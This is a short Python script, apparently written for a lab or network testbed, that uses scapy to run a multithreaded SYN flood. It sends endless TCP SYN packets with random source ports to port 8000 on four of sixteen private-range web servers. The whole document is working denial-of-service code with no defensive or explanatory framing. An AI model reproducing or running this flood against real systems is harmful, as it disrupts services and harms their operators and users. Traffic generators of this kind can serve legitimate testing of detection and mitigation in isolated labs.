# """Distributed SYN Flood Attack"""
from scapy.all import *
import sys
import random
import threading

targets = [f"10.0.1.{i}" for i in range(1, 17)]  # All web servers
target_port = 8000

def attack_target(target_ip):
    print(f"[Attacker] Starting SYN flood to {target_ip}")
    while True:
        try:
            src_port = random.randint(1024, 65535)
            ip = IP(dst=target_ip)
            tcp = TCP(sport=src_port, dport=target_port, flags='S', seq=random.randint(0, 1000000))
            send(ip/tcp, verbose=0, inter=0.001)  # 1000 pps per attacker
        except KeyboardInterrupt:
            break
        except Exception as e:
            continue

if __name__ == "__main__":
    threads = []
    for target in targets[:4]:  # Attack 4 servers simultaneously
        t = threading.Thread(target=attack_target, args=(target,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[Attacker] Stopping attack")